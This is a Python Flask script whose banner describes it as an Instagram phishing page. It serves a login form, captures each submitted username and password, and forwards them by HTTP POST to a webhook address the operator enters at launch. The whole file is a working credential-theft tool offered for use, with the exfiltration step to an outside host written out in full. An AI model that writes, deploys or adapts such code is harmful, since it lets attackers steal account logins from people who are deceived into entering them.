from flask import Flask, request, render_template
import requests

def banner():
    print(r"""
**************************************************************
              __                                  __
  _______  __/ /_  ___  _________ ___  ____ _____/ /
 / ___/ / / / __ \/ _ \/ ___/ __ `__ \/ __ `/ __  /  
/ /__/ /_/ / /_/ /  __/ /  / / / / / / /_/ / /_/ / 
\___/\__, /_.___/\___/_/  /_/ /_/ /_/\__,_/\__,_/   
    /____/            
                                        
    [cybermad]  : "instagram phishing page with flask server"
    [Github]    : https://github.com/madanokr001
    [Telegram]  : https://t.me/cybermads
          """)
    
app = Flask(__name__)

@app.route("/", methods=["POST", "GET"])
def login_page():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        data = {
            "content": f"{username}\n{password}"
        }

        try:
            response = requests.post(webhook, json=data)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(e)

    return render_template("index.html")

if __name__ == "__main__":
    banner()
    webhook = input("[+] webhook     > ")
    app.run(host="0.0.0.0", port=5000)
